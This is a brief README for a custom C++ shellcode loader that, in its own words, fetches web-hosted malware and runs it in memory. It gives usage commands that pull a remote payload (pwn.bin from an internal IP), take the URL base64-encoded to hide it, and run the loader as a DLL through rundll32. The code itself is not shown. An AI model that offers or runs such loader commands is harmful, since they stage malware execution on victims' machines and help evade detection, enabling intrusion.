# Ryan's Remote Loader

Custom shellcode loader written in C++. This will grab your web hosted malware and run it in memory.

This project is password protected at this time.

## Examples:
RRL.exe will take the remote bin file as a parameter like:
`RRL.exe http://10.0.0.54/pwn.bin`

RRL.exe can also take b64 encoded payloads:
`RRL.exe -enc aHR0cDovLzEwLjAuMC41NC9wd24uYmluCg==`


This can also be run as a DLL like the following: 
`rundll32.exe RRLDLL.dll,Driver aHR0cDovLzEwLjAuMC41NC9wd24uYmluCg==`